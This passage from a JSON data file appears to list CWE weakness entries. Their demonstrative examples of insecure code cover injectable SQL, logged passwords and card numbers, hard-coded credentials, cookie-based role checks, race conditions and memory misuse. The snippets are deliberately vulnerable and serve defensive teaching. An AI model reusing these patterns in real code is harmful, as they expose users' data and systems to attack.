        "demonstrative_examples": "Example 1 \"In the following code snippet, a user's full name and credit card number are written to a log file.\" (bad code) Example Language: Java logger.info(\"Username: \" + usernme + \", CCN: \" + ccn); Example 2 This code stores location information about the current user: (bad code) Example Language: Java locationClient = new LocationClient(this, this, this); locationClient.connect(); currentUser.setLocation(locationClient.getLastLocation()); ... catch (Exception e) { AlertDialog.Builder builder = new AlertDialog.Builder(this); builder.setMessage(\"Sorry, this application has experienced an error.\"); AlertDialog alert = builder.create(); alert.show(); Log.e(\"ExampleActivity\", \"Caught exception: \" + e + \" While on User:\" + User.toString()); } \"When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.\" Example 3 In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file. (bad code) Example Language: Java public BankAccount getUserBankAccount(String username, String accountNumber) { BankAccount userAccount = null; String query = null; try { if (isAuthorizedUser(username)) { query = \"SELECT * FROM accounts WHERE owner = \" + username + \" AND accountID = \" + accountNumber; DatabaseManager dbManager = new DatabaseManager(); Connection conn = dbManager.getConnection(); Statement stmt = conn.createStatement(); ResultSet queryResult = stmt.executeQuery(query); userAccount = (BankAccount)queryResult.getObject(accountNumber); } } catch (SQLException ex) { String logMessage = \"Unable to retrieve account information from database,\\\\nquery: \" + query; Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex); } return userAccount; } The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection ( CWE-89 ) to directly access the database."
    },
    {
        "id": 535,
        "demonstrative_examples": ""
    },
    {
        "id": 536,
        "demonstrative_examples": "Example 1 The following servlet code does not catch runtime exceptions, meaning that if such an exception were to occur, the container may display potentially dangerous information (such as a full stack trace). (bad code) Example Language: Java public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String username = request.getParameter(\"username\"); // May cause unchecked NullPointerException. if (username.length() < 10) { ... } }"
    },
    {
        "id": 537,
        "demonstrative_examples": "Example 1 In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user. (bad code) Example Language: Java public class InputFileRead { private File readFile = null; private FileReader reader = null; private String inputFilePath = null; private final String DEFAULT_FILE_PATH = \"c:\\\\\\\\somedirectory\\\\\\\\\"; public InputFileRead() { inputFilePath = DEFAULT_FILE_PATH; } public void setInputFile(String inputFile) { /* Assume appropriate validation / encoding is used and privileges / permissions are preserved */ } public void readInputFile() { try { reader = new FileReader(readFile); ... } catch (RuntimeException rex) { System.err.println(\"Error: Cannot open input file in the directory \" + inputFilePath); System.err.println(\"Input file has not been set, call setInputFile method before calling readInputFile\"); } catch (FileNotFoundException ex) {...} } } However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user. Example 2 In the example below, the BankManagerLoginServlet servlet class will process a login request to determine if a user is authorized to use the BankManager Web service. The doPost method will retrieve the username and password from the servlet request and will determine if the user is authorized. If the user is authorized the servlet will go to the successful login page. Otherwise, the servlet will raise a FailedLoginException and output the failed login message to the error page of the service. (bad code) Example Language: Java public class BankManagerLoginServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { // Get username and password from login page request String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); // Authenticate user BankManager bankMgr = new BankManager(); boolean isAuthentic = bankMgr.authenticateUser(username, password); // If user is authenticated then go to successful login page if (isAuthentic) { request.setAttribute(\"login\", new String(\"Login Successful.\")); getServletContext().getRequestDispatcher(\"/BankManagerServiceLoggedIn.jsp\"). forward(request, response); } else { // Otherwise, raise failed login exception and output unsuccessful login message to error page throw new FailedLoginException(\"Failed Login for user \" + username + \" with password \" + password); } } catch (FailedLoginException ex) { // output failed login message to error page request.setAttribute(\"error\", new String(\"Login Error\")); request.setAttribute(\"message\", ex.getMessage()); getServletContext().getRequestDispatcher(\"/ErrorPage.jsp\").forward(request, response); } } \"However, the output message generated by the FailedLoginException includes the user-supplied password. Even if the password is erroneous, it is probably close to the correct password. Since it is printed to the user's page, anybody who can see the screen display will be able to see the password. Also, if the page is cached, the password might be written to disk.\""
    },
    {
        "id": 538,
        "demonstrative_examples": ""
    },
    {
        "id": 539,
        "demonstrative_examples": ""
    },
    {
        "id": 540,
        "demonstrative_examples": ""
    },
    {
        "id": 541,
        "demonstrative_examples": "Example 1 The following code uses an include file to store database credentials: database.inc (bad code) Example Language: PHP <?php \"$dbName = 'usersDB';\" \"$dbPassword = 'skjdh#67nkjd3$3$';\" ?> login.php (bad code) Example Language: PHP <?php \"include('database.inc');\" $db = connectToDB($dbName, $dbPassword); $db.authenticateUser($username, $password); ?> If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password."
    },
    {
        "id": 543,
        "demonstrative_examples": "Example 1 This method is part of a singleton pattern, yet the following singleton() pattern is not thread-safe. It is possible that the method will create two objects instead of only one. (bad code) Example Language: Java private static NumberConverter singleton; public static NumberConverter get_singleton() { if (singleton == null) { singleton = new NumberConverter(); } return singleton; } Consider the following course of events: Thread A enters the method, finds singleton to be null, begins the NumberConverter constructor, and then is swapped out of execution. Thread B enters the method and finds that singleton remains null. This will happen if A was swapped out during the middle of the constructor, because the object reference is not set to point at the new object on the heap until the object is fully initialized. Thread B continues and constructs another NumberConverter object and returns it while exiting the method. Thread A continues, finishes constructing its NumberConverter object, and returns its version. At this point, the threads have created and returned two different objects."
    },
    {
        "id": 544,
        "demonstrative_examples": ""
    },
    {
        "id": 546,
        "demonstrative_examples": "Example 1 The following excerpt demonstrates the use of a suspicious comment in an incomplete code block that may have security repercussions. (bad code) Example Language: Java if (user == null) { // TODO: Handle null user condition. }"
    },
    {
        "id": 547,
        "demonstrative_examples": "Example 1 The usage of symbolic names instead of hard-coded constants is preferred. The following is an example of using a hard-coded constant instead of a symbolic name. (bad code) Example Language: C char buffer[1024]; ... fgets(buffer, 1024, stdin); If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurences, in this example it could lead to a buffer overflow. (bad code) Example Language: C enum { MAX_BUFFER_SIZE = 1024 }; ... char buffer[MAX_BUFFER_SIZE]; ... fgets(buffer, MAX_BUFFER_SIZE, stdin); In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant."
    },
    {
        "id": 548,
        "demonstrative_examples": ""
    },
    {
        "id": 549,
        "demonstrative_examples": ""
    },
    {
        "id": 550,
        "demonstrative_examples": ""
    },
    {
        "id": 551,
        "demonstrative_examples": ""
    },
    {
        "id": 552,
        "demonstrative_examples": ""
    },
    {
        "id": 553,
        "demonstrative_examples": ""
    },
    {
        "id": 554,
        "demonstrative_examples": ""
    },
    {
        "id": 555,
        "demonstrative_examples": "Example 1 Below is a snippet from a Java properties file in which the LDAP server password is stored in plaintext. (bad code) Example Language: Java webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword"
    },
    {
        "id": 556,
        "demonstrative_examples": ""
    },
    {
        "id": 558,
        "demonstrative_examples": "Example 1 The following code relies on getlogin() to determine whether or not a user is trusted. It is easily subverted. (bad code) Example Language: C pwd = getpwnam(getlogin()); if (isTrustedGroup(pwd->pw_gid)) { allow(); } else { deny(); }"
    },
    {
        "id": 560,
        "demonstrative_examples": ""
    },
    {
        "id": 561,
        "demonstrative_examples": "Example 1 The condition for the second if statement is impossible to satisfy. It requires that the variables be non-null, while on the only path where s can be assigned a non-null value there is a return statement. (bad code) Example Language: C++ String s = null; if (b) { s = \"Yes\"; return; } if (s != null) { Dead(); } Example 2 In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code. (bad code) Example Language: Java public class DoubleDead { private void doTweedledee() { doTweedledumb(); } private void doTweedledumb() { doTweedledee(); } public static void main(String[] args) { System.out.println(\"running DoubleDead\"); } } (In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.) Example 3 The field named glue is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant. (bad code) Example Language: Java public class Dead { String glue; public String getGlue() { return \"glue\"; } }"
    },
    {
        "id": 562,
        "demonstrative_examples": "Example 1 The following function returns a stack address. (bad code) Example Language: C char* getName() { char name[STR_MAX]; fillInName(name); return name; }"
    },
    {
        "id": 563,
        "demonstrative_examples": "Example 1 The following code excerpt assigns to the variable r and then overwrites the value without using it. (bad code) Example Language: C r = getName(); r = getNewBuffer(buf);"
    },
    {
        "id": 564,
        "demonstrative_examples": "Example 1 \"The following code excerpt uses Hibernate's HQL syntax to build a dynamic query that's vulnerable to SQL injection.\" (bad code) Example Language: Java String street = getStreetFromUser(); Query query = session.createQuery(\"from Address a where a.street=\\'\" + street + \"\\'\");"
    },
    {
        "id": 565,
        "demonstrative_examples": "Example 1 The following code excerpt reads a value from a browser cookie to determine the role of the user. (bad code) Example Language: Java Cookie[] cookies = request.getCookies(); for (int i =0; i< cookies.length; i++) { Cookie c = cookies[i]; if (c.getName().equals(\"role\")) { userRole = c.getValue(); } } It is easy for an attacker to modify the \"role\" value found in the locally stored cookie, allowing privilege escalation."
    },
    {
        "id": 566,
        "demonstrative_examples": "Example 1 The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. (bad code) Example Language: C# ... conn = new SqlConnection(_ConnectionString); conn.Open(); int16 id = System.Convert.ToInt16(invoiceID.Text); SqlCommand query = new SqlCommand( \"SELECT * FROM invoices WHERE id = @id\", conn); query.Parameters.AddWithValue(\"@id\", id); SqlDataReader objReader = objCommand.ExecuteReader(); ... The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user."
    },
    {
        "id": 567,
        "demonstrative_examples": "Example 1 The following code implements a basic counter for how many times the page has been accesed. (bad code) Example Language: Java public static class Counter extends HttpServlet { static int count = 0; protected void doGet(HttpServletRequest in, HttpServletResponse out) throws ServletException, IOException { out.setContentType(\"text/plain\"); PrintWriter p = out.getWriter(); count++; p.println(count + \" hits so far!\"); } } Consider when two separate threads, Thread A and Thread B, concurrently handle two different requests: Assume this is the first occurrence of doGet, so the value of count is 0. doGet() is called within Thread A. The execution of doGet() in Thread A continues to the point AFTER the value of the count variable is read, then incremented, but BEFORE it is saved back to count. At this stage, the incremented value is 1, but the value of count is 0. doGet() is called within Thread B, and due to a higher thread priority, Thread B progresses to the point where the count variable is accessed (where it is still 0), incremented, and saved. After the save, count is 1. Thread A continues. It saves the intermediate, incremented value to the count variable - but the incremented value is 1, so count is \"re-saved\" to 1. At this point, both Thread A and Thread B print that one hit has been seen, even though two separate requests have been processed. The value of count should be 2, not 1. While this example does not have any real serious implications, if the shared variable in question is used for resource tracking, then resource consumption could occur. Other scenarios exist."
    },
    {
        "id": 568,
        "demonstrative_examples": "Example 1 The following method omits the call to super.finalize(). (bad code) Example Language: Java protected void finalize() { discardNative(); }"
    },
    {
        "id": 570,
        "demonstrative_examples": "Example 1 In the following Java example the updateUserAccountOrder() method used within an e-business product ordering/inventory application will validate the product number that was ordered and the user account number. If they are valid, the method will update the product inventory, the user account, and the user order appropriately. (bad code) Example Language: Java public void updateUserAccountOrder(String productNumber, String accountNumber) { boolean isValidProduct = false; boolean isValidAccount = false; if (validProductNumber(productNumber)) { isValidProduct = true; updateInventory(productNumber); } else { return; } if (validAccountNumber(accountNumber)) { isValidProduct = true; updateAccount(accountNumber, productNumber); } if (isValidProduct && isValidAccount) { updateAccountOrder(accountNumber, productNumber); } } However, the method never sets the isValidAccount variable after initializing it to false so the isValidProduct is mistakenly used twice. The result is that the expression \"isValidProduct && isValidAccount\" will always evaluate to false, so the updateAccountOrder() method will never be invoked. This will create serious problems with the product ordering application since the user account and inventory databases will be updated but the order will not be updated. This can be easily corrected by updating the appropriate variable. (good code) ... if (validAccountNumber(accountNumber)) { isValidAccount = true; updateAccount(accountNumber, productNumber); } ... Example 2 In the following example, the hasReadWriteAccess method uses bit masks and bit operators to determine if a user has read and write privileges for a particular process. The variable mask is defined as a bit mask from the BIT_READ and BIT_WRITE constants that have been defined. The variable mask is used within the predicate of the hasReadWriteAccess method to determine if the userMask input parameter has the read and write bits set. (bad code) Example Language: C #define BIT_READ 0x0001 // 00000001 #define BIT_WRITE 0x0010 // 00010000 unsigned int mask = BIT_READ & BIT_WRITE; /* intended to use \"|\" */ // using \"&\", mask = 00000000 // using \"|\", mask = 00010001 // determine if user has read and write access int hasReadWriteAccess(unsigned int userMask) { // if the userMask has read and write bits set // then return 1 (true) if (userMask & mask) { return 1; } // otherwise return 0 (false) return 0; } However the bit operator used to initialize the mask variable is the AND operator rather than the intended OR operator ( CWE-480 ), this resulted in the variable mask being set to 0. As a result, the if statement will always evaluate to false and never get executed. The use of bit masks, bit operators and bitwise operations on variables can be difficult. If possible, try to use frameworks or libraries that provide appropriate functionality and abstract the implementation. Example 3 In the following example, the updateInventory method used within an e-business inventory application will update the inventory for a particular product. This method includes an if statement with an expression that will always evaluate to false. This is a common practice in C/C++ to introduce debugging statements quickly by simply changing the expression to evaluate to true and then removing those debugging statements by changing expression to evaluate to false. This is also a common practice for disabling features no longer needed. (bad code) Example Language: C int updateInventory(char* productNumber, int numberOfItems) { int initCount = getProductCount(productNumber); int updatedCount = initCount + numberOfItems; int updated = updateProductCount(updatedCount); // if statement for debugging purposes only if (1 == 0) { char productName[128]; productName = getProductName(productNumber); printf(\"product %s initially has %d items in inventory \\\\n\", productName, initCount); printf(\"adding %d items to inventory for %s \\\\n\", numberOfItems, productName); if (updated == 0) { printf(\"Inventory updated for product %s to %d items \\\\n\", productName, updatedCount); } else { printf(\"Inventory not updated for product: %s \\\\n\", productName); } } return updated; } Using this practice for introducing debugging statements or disabling features creates dead code that can cause problems during code maintenance and potentially introduce vulnerabilities. To avoid using expressions that evaluate to false for debugging purposes a logging API or debugging API should be used for the output of debugging messages."
    },
    {
        "id": 571,
        "demonstrative_examples": "Example 1 In the following Java example the updateInventory() method used within an e-business product ordering/inventory application will check if the input product number is in the store or in the warehouse. If the product is found, the method will update the store or warehouse database as well as the aggregate product database. If the product is not found, the method intends to do some special processing without updating any database. (bad code) Example Language: Java public void updateInventory(String productNumber) { boolean isProductAvailable = false; boolean isDelayed = false; if (productInStore(productNumber)) { isProductAvailable = true; updateInStoreDatabase(productNumber); } else if (productInWarehouse(productNumber)) { isProductAvailable = true; updateInWarehouseDatabase(productNumber); } else { isProductAvailable = true; } if ( isProductAvailable ) { updateProductDatabase(productNumber); } else if ( isDelayed ) { /* Warn customer about delay before order processing */ ... } } However, the method never sets the isDelayed variable and instead will always update the isProductAvailable variable to true. The result is that the predicate testing the isProductAvailable boolean will always evaluate to true and therefore always update the product database. Further, since the isDelayed variable is initialized to false and never changed, the expression always evaluates to false and the customer will never be warned of a delay on their product."
    },
    {
        "id": 572,
        "demonstrative_examples": "Example 1 The following excerpt from a Java program mistakenly calls run() instead of start(). (bad code) Example Language: Java Thread thr = new Thread() { public void run() { ... } }; thr.run();"
    },
    {
        "id": 573,
        "demonstrative_examples": ""
    },
    {
        "id": 574,
        "demonstrative_examples": "Example 1 In the following Java example a Customer Entity EJB provides access to customer information in a database for a business application. (bad code) Example Language: Java @Entity public class Customer implements Serializable { private String id; private String firstName; private String lastName; private Address address; public Customer() {...} public Customer(String id, String firstName, String lastName) {...} @Id public String getCustomerId() {...} public synchronized void setCustomerId(String id) {...} public String getFirstName() {...} public synchronized void setFirstName(String firstName) {...} public String getLastName() {...} public synchronized void setLastName(String lastName) {...} @OneToOne() public Address getAddress() {...} public synchronized void setAddress(Address address) {...} } However, the customer entity EJB uses the synchronized keyword for the set methods to attempt to provide thread safe synchronization for the member variables. The use of synchronized methods violate the restriction of the EJB specification against the use synchronization primitives within EJBs. Using synchronization primitives may cause inconsistent behavior of the EJB when used within different EJB containers."
    },
    {
        "id": 575,
        "demonstrative_examples": "Example 1 The following Java example is a simple converter class for converting US dollars to Yen. This converter class demonstrates the improper practice of using a stateless session Enterprise JavaBean that implements an AWT Component and AWT keyboard event listener to retrieve keyboard input from the user for the amount of the US dollars to convert to Yen. (bad code) Example Language: Java @Stateless public class ConverterSessionBean extends Component implements KeyListener, ConverterSessionRemote { /* member variables for receiving keyboard input using AWT API */ ... private StringBuffer enteredText = new StringBuffer(); /* conversion rate on US dollars to Yen */ private BigDecimal yenRate = new BigDecimal(\"115.3100\"); public ConverterSessionBean() { super(); /* method calls for setting up AWT Component for receiving keyboard input */ ... addKeyListener(this); } public BigDecimal dollarToYen(BigDecimal dollars) { BigDecimal result = dollars.multiply(yenRate); return result.setScale(2, BigDecimal.ROUND_DOWN); } /* member functions for implementing AWT KeyListener interface */ public void keyTyped(KeyEvent event) { ... } public void keyPressed(KeyEvent e) { } public void keyReleased(KeyEvent e) { } /* member functions for receiving keyboard input and displaying output */ public void paint(Graphics g) {...} ... } This use of the AWT and Swing APIs within any kind of Enterprise JavaBean not only violates the restriction of the EJB specification against using AWT or Swing within an EJB but also violates the intended use of Enterprise JavaBeans to separate business logic from presentation logic. The Stateless Session Enterprise JavaBean should contain only business logic. Presentation logic should be provided by some other mechanism such as Servlets or Java Server Pages (JSP) as in the following Java/JSP example. (good code) Example Language: Java @Stateless public class ConverterSessionBean implements ConverterSessionRemoteInterface { /* conversion rate on US dollars to Yen */ private BigDecimal yenRate = new BigDecimal(\"115.3100\"); public ConverterSessionBean() { } /* remote method to convert US dollars to Yen */ public BigDecimal dollarToYen(BigDecimal dollars) { BigDecimal result = dollars.multiply(yenRate); return result.setScale(2, BigDecimal.ROUND_DOWN); } } (good code) Example Language: JSP <%@ page import=\"converter.ejb.Converter, java.math.*, javax.naming.*\"%> <%! private Converter converter = null; public void jspInit() { try { InitialContext ic = new InitialContext(); converter = (Converter) ic.lookup(Converter.class.getName()); } catch (Exception ex) { System.out.println(\"Couldn\\'t create converter bean.\"+ ex.getMessage()); } } public void jspDestroy() { converter = null; } %> <html> <head><title>Converter</title></head> <body bgcolor=\"white\"> <h1>Converter</h1> <hr> <p>Enter an amount to convert:</p> <form method=\"get\"> <input type=\"text\" name=\"amount\" size=\"25\"><br> <p> <input type=\"submit\" value=\"Submit\"> <input type=\"reset\" value=\"Reset\"> </form> <% String amount = request.getParameter(\"amount\"); if ( amount != null && amount.length() > 0 ) { BigDecimal d = new BigDecimal(amount); BigDecimal yenAmount = converter.dollarToYen(d); %> <p> <%= amount %> dollars are <%= yenAmount %> Yen. <p> <% } %> </body> </html>"
    },
    {
        "id": 576,
        "demonstrative_examples": "Example 1 The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. In this example, the interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Java I/O API to retrieve the XML document from the local file system. (bad code) Example Language: Java @Stateless public class InterestRateBean implements InterestRateRemote { private Document interestRateXMLDocument = null; private File interestRateFile = null; public InterestRateBean() { try { /* get XML document from the local filesystem */ interestRateFile = new File(Constants.INTEREST_RATE_FILE); if (interestRateFile.exists()) { DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); interestRateXMLDocument = db.parse(interestRateFile); } } catch (IOException ex) {...} } public BigDecimal getInterestRate(Integer points) { return getInterestRateFromXML(points); } /* member function to retrieve interest rate from XML document on the local file system */ private BigDecimal getInterestRateFromXML(Integer points) {...} } This use of the Java I/O API within any kind of Enterprise JavaBean violates the EJB specification by using the java.io package for accessing files within the local filesystem. An Enterprise JavaBean should use a resource manager API for storing and accessing data. In the following example, the private member function getInterestRateFromXMLParser uses an XML parser API to retrieve the interest rates. (good code) Example Language: Java @Stateless public class InterestRateBean implements InterestRateRemote { public InterestRateBean() { } public BigDecimal getInterestRate(Integer points) { return getInterestRateFromXMLParser(points); } /* member function to retrieve interest rate from XML document using an XML parser API */ private BigDecimal getInterestRateFromXMLParser(Integer points) {...} }"
    },
    {
        "id": 577,
        "demonstrative_examples": "Example 1 The following Java example is a simple stateless Enterprise JavaBean that retrieves stock symbols and stock values. The Enterprise JavaBean creates a socket and listens for and accepts connections from clients on the socket. (bad code) Example Language: Java @Stateless public class StockSymbolBean implements StockSymbolRemote { ServerSocket serverSocket = null; Socket clientSocket = null; public StockSymbolBean() { try { serverSocket = new ServerSocket(Constants.SOCKET_PORT); } catch (IOException ex) {...} try { clientSocket = serverSocket.accept(); } catch (IOException e) {...} } public String getStockSymbol(String name) {...} public BigDecimal getStockValue(String symbol) {...} private void processClientInputFromSocket() {...} } And the following Java example is similar to the previous example but demonstrates the use of multicast socket connections within an Enterprise JavaBean. (bad code) Example Language: Java @Stateless public class StockSymbolBean extends Thread implements StockSymbolRemote { ServerSocket serverSocket = null; Socket clientSocket = null; boolean listening = false; public StockSymbolBean() { try { serverSocket = new ServerSocket(Constants.SOCKET_PORT); } catch (IOException ex) {...} listening = true; while(listening) { start(); } } public String getStockSymbol(String name) {...} public BigDecimal getStockValue(String symbol) {...} public void run() { try { clientSocket = serverSocket.accept(); } catch (IOException e) {...} ... } } The previous two examples within any type of Enterprise JavaBean violate the EJB specification by attempting to listen on a socket, accepting connections on a socket, or using a socket for multicast."
    },
    {
        "id": 578,
        "demonstrative_examples": "Example 1 The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. The interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Class Loader for the EJB class to obtain the XML document from the local file system as an input stream. (bad code) Example Language: Java @Stateless public class InterestRateBean implements InterestRateRemote { private Document interestRateXMLDocument = null; public InterestRateBean() { try { // get XML document from the local filesystem as an input stream // using the ClassLoader for this class ClassLoader loader = this.getClass().getClassLoader(); InputStream in = loader.getResourceAsStream(Constants.INTEREST_RATE_FILE); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); interestRateXMLDocument = db.parse(interestRateFile); } catch (IOException ex) {...} } public BigDecimal getInterestRate(Integer points) { return getInterestRateFromXML(points); } /* member function to retrieve interest rate from XML document on the local file system */ private BigDecimal getInterestRateFromXML(Integer points) {...} } This use of the Java Class Loader class within any kind of Enterprise JavaBean violates the restriction of the EJB specification against obtaining the current class loader as this could compromise the security of the application using the EJB. Example 2 An EJB is also restricted from creating a custom class loader and creating a class and instance of a class from the class loader, as shown in the following example. (bad code) Example Language: Java @Stateless public class LoaderSessionBean implements LoaderSessionRemote { public LoaderSessionBean() { try { ClassLoader loader = new CustomClassLoader(); Class c = loader.loadClass(\"someClass\"); Object obj = c.newInstance(); /* perform some task that uses the new class instance member variables or functions */ ... } catch (Exception ex) {...} } public class CustomClassLoader extends ClassLoader { } }"
    },
    {
        "id": 579,
        "demonstrative_examples": "Example 1 The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated. (bad code) Example Language: Java public class DataGlob { String globName; String globValue; public void addToSession(HttpSession session) { session.setAttribute(\"glob\", this); } }"
    },
    {
        "id": 580,
        "demonstrative_examples": "Example 1 \"The following two classes demonstrate a bug introduced by not calling super.clone(). Because of the way Kibitzer implements clone(), FancyKibitzer's clone method will return an object of type Kibitzer instead of FancyKibitzer.\" (bad code) Example Language: Java public class Kibitzer { public Object clone() throws CloneNotSupportedException { Object returnMe = new Kibitzer(); ... } } public class FancyKibitzer extends Kibitzer{ public Object clone() throws CloneNotSupportedException { Object returnMe = super.clone(); ... } }"
    },
    {
        "id": 581,
        "demonstrative_examples": ""
    },
    {
        "id": 582,
        "demonstrative_examples": "Example 1 The following Java Applet code mistakenly declares an array public, final and static. (bad code) Example Language: Java public final class urlTool extends Applet { public final static URL[] urls; ... }"
    },
    {
        "id": 583,
        "demonstrative_examples": "Example 1 The following Java Applet code mistakenly declares a public finalize() method. (bad code) Example Language: Java public final class urlTool extends Applet { public void finalize() { ... } ... } \"Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.\""
    },
    {
        "id": 584,
        "demonstrative_examples": "Example 1 In the following code excerpt, the IllegalArgumentException will never be delivered to the caller. The finally block will cause the exception to be discarded. (bad code) Example Language: Java try { ... throw IllegalArgumentException(); } finally { return r; }"
    },
    {
        "id": 585,
        "demonstrative_examples": "Example 1 The following code attempts to synchronize on an object, but does not execute anything in the synchronized block. This does not actually accomplish anything and may be a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend. (bad code) Example Language: Java synchronized(this) { } Instead, in a correct usage, the synchronized statement should contain procedures that access or modify data that is exposed to multiple threads. For example, consider a scenario in which several threads are accessing student records at the same time. The method which sets the student ID to a new value will need to make sure that nobody else is accessing this data at the same time and will require synchronization. (good code) public void setID(int ID){ synchronized(this){ this.ID = ID; } }"
    },
    {
        "id": 586,
        "demonstrative_examples": "Example 1 The following code fragment calls finalize() explicitly: (bad code) Example Language: Java // time to clean up widget.finalize();"
    },
    {
        "id": 587,
        "demonstrative_examples": "Example 1 This code assumes a particular function will always be found at a particular address. It assigns a pointer to that address and calls the function. (bad code) Example Language: C int (*pt2Function) (float, char, char)=0x08040000; \"int result2 = (*pt2Function) (12, 'a', 'b');\" // Here we can inject code to execute. The same function may not always be found at the same memory address. This could lead to a crash, or an attacker may alter the memory at the expected address, leading to arbitrary code execution."
    },
    {
        "id": 588,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C struct foo { int i; } ... int main(int argc, char **argv) { *foo = (struct foo *)main; foo->i = 2; return foo->i; }"
    },
    {
        "id": 589,
        "demonstrative_examples": ""
    },
    {
        "id": 590,
        "demonstrative_examples": "Example 1 In this example, an array of record_t structs, bar, is allocated automatically on the stack as a local variable and the programmer attempts to call free() on the array. The consequences will vary based on the implementation of free(), but it will not succeed in deallocating the memory. (bad code) Example Language: C void foo(){ record_t bar[MAX_SIZE]; /* do something interesting with bar */ ... free(bar); } This example shows the array allocated globally, as part of the data segment of memory and the programmer attempts to call free() on the array. (bad code) Example Language: C record_t bar[MAX_SIZE]; //Global var void foo(){ /* do something interesting with bar */ ... free(bar); } Instead, if the programmer wanted to dynamically manage the memory, malloc() or calloc() should have been used. (good code) void foo(){ record_t *bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t)); /* do something interesting with bar */ ... free(bar); } Additionally, you can pass global variables to free() when they are pointers to dynamically allocated memory. (good code) record_t *bar; //Global var void foo(){ bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t)); /* do something interesting with bar */ ... free(bar); }"
    },
    {
        "id": 591,
        "demonstrative_examples": ""
    },
    {
        "id": 593,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C #define CERT \"secret.pem\" #define CERT2 \"secret2.pem\" int main(){ SSL_CTX *ctx; SSL *ssl; init_OpenSSL(); seed_prng(); ctx = SSL_CTX_new(SSLv23_method()); if (SSL_CTX_use_certificate_chain_file(ctx, CERT) != 1) int_error(\"Error loading certificate from file\"); if (SSL_CTX_use_PrivateKey_file(ctx, CERT, SSL_FILETYPE_PEM) != 1) int_error(\"Error loading private key from file\"); if (!(ssl = SSL_new(ctx))) int_error(\"Error creating an SSL context\"); if ( SSL_CTX_set_default_passwd_cb(ctx, \"new default password\" != 1)) int_error(\"Doing something which is dangerous to do anyways\"); if (!(ssl2 = SSL_new(ctx))) int_error(\"Error creating an SSL context\"); }"
    },
    {
        "id": 594,
        "demonstrative_examples": "Example 1 In the following Java example, a Customer Entity JavaBean provides access to customer information in a database for a business application. The Customer Entity JavaBean is used as a session scoped object to return customer information to a Session EJB. (bad code) Example Language: Java @Entity public class Customer { private String id; private String firstName; private String lastName; private Address address; public Customer() { } public Customer(String id, String firstName, String lastName) {...} @Id public String getCustomerId() {...} public void setCustomerId(String id) {...} public String getFirstName() {...} public void setFirstName(String firstName) {...} public String getLastName() {...} public void setLastName(String lastName) {...} @OneToOne() public Address getAddress() {...} public void setAddress(Address address) {...} } However, the Customer Entity JavaBean is an unserialized object which can cause serialization failure and crash the application when the J2EE container attempts to write the object to the system. Session scoped objects must implement the Serializable interface to ensure that the objects serialize properly. (good code) Example Language: Java public class Customer implements Serializable {...}"
    },
    {
        "id": 595,
